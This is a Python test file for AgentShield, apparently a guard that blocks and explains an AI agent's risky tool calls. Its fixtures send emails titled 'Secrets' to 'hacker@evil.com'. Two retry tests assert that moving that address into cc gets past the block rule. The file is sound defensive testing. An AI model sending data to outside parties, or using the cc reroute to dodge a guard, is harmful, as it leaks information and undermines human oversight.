import asyncio

from fastapi.testclient import TestClient
from langchain_core.tools import tool

from agentshield import AgentShield
from agentshield.api import server


def test_negotiation_explains_block_reason() -> None:
    shield = AgentShield(mode="shadow", policy_path="policies/default.yaml")
    action, negotiation = asyncio.run(
        shield.intercept_with_negotiation(
            "send_email",
            {"to": "hacker@evil.com", "subject": "Secrets"},
            agent_id="agent-1",
        )
    )
    assert action.decision == "block", "Expected external email to be blocked by policy."
    assert negotiation is not None, "Negotiation response should be produced for blocked actions."
    assert "External recipient detected" in negotiation.explanation["human_readable"], (
        "Block explanation should cite external recipient."
    )


def test_negotiation_suggests_alternatives() -> None:
    shield = AgentShield(mode="shadow", policy_path="policies/default.yaml")
    _, negotiation = asyncio.run(
        shield.intercept_with_negotiation(
            "send_email",
            {"to": "hacker@evil.com", "subject": "Secrets"},
            agent_id="agent-2",
        )
    )
    assert negotiation is not None
    actions = [s["action"] for s in negotiation.suggestions]
    assert "modify_recipient" in actions, "Negotiation should suggest internal relay for external email."
    assert "request_human_approval" in actions, "Negotiation should suggest requesting approval."


def test_agent_retry_after_modification() -> None:
    shield = AgentShield(mode="shadow", policy_path="policies/default.yaml")
    blocked_action, blocked_negotiation = asyncio.run(
        shield.intercept_with_negotiation(
            "send_email",
            {"to": "hacker@evil.com", "subject": "Initial"},
            agent_id="agent-3",
        )
    )
    assert blocked_action.decision == "block"
    assert blocked_negotiation is not None

    retry_action, retry_negotiation = asyncio.run(
        shield.intercept_with_negotiation(
            "send_email",
            {"to": "manager@yourcompany.com", "cc": "hacker@evil.com", "subject": "Reworked"},
            agent_id="agent-3",
        )
    )
    assert retry_action.decision == "shadow", "Modified action should pass block rule and fall back to shadow mode."
    assert retry_negotiation is not None, "Shadow decisions should still provide negotiation guidance."


def test_negotiation_history_tracked() -> None:
    with TestClient(server.app) as client:
        if server._shield is not None:
            server._shield.audit_log.clear()
            server._shield.negotiator.negotiation_history.clear()
            server._request_counts_by_agent.clear()

        response = client.post(
            "/api/v1/intercept",
            json={
                "tool_name": "send_email",
                "arguments": {"to": "hacker@evil.com", "subject": "s"},
                "agent_id": "history-agent",
            },
        )
        assert response.status_code == 200
        action_id = response.json()["action_id"]

        negotiate_response = client.post(f"/api/v1/negotiate/{action_id}")
        assert negotiate_response.status_code == 200
        history_response = client.get("/api/v1/negotiation-history")
        assert history_response.status_code == 200
        history = history_response.json()
        assert len(history) >= 1, "Negotiation history should contain at least one record."
        assert history[-1]["action_id"] == action_id, "Latest history entry should correspond to negotiated action."

        db_history_response = client.get("/api/v1/negotiations")
        assert db_history_response.status_code == 200
        assert isinstance(db_history_response.json(), list)


def test_langchain_blocked_message_includes_explanation() -> None:
    @tool
    def send_email(to: str, subject: str) -> str:
        """Send an email."""
        return f"sent to {to}: {subject}"

    shield = AgentShield(mode="shadow", policy_path="policies/default.yaml")
    protected = shield.protect([send_email])
    message = protected[0].invoke({"to": "hacker@evil.com", "subject": "Confidential"})

    assert "[AgentShield BLOCKED]" in message, "Blocked LangChain message must use BLOCKED format."
    assert "External recipient detected" in message, "Blocked message should include clear reason."
    assert "Suggestions:" in message, "Blocked message should include actionable suggestions."
    assert "Risk:" in message, "Blocked message should include risk score."


def test_retry_endpoint_creates_negotiation_chain() -> None:
    with TestClient(server.app) as client:
        if server._shield is not None:
            server._shield.audit_log.clear()
            server._shield.negotiator.negotiation_history.clear()
            server._request_counts_by_agent.clear()

        first = client.post(
            "/api/v1/intercept",
            json={
                "tool_name": "send_email",
                "arguments": {"to": "hacker@evil.com", "subject": "s"},
                "agent_id": "retry-agent",
            },
        )
        assert first.status_code == 200
        action_id = first.json()["action_id"]
        retry = client.post(
            f"/api/v1/retry/{action_id}",
            json={
                "modified_arguments": {
                    "to": "manager@yourcompany.com",
                    "cc": "hacker@evil.com",
                    "subject": "retry",
                },
                "requested_by": "retry-agent",
            },
        )
        assert retry.status_code == 200
        payload = retry.json()
        assert payload["status"] == "retried"
        assert payload["chain"]["original_action_id"] == action_id
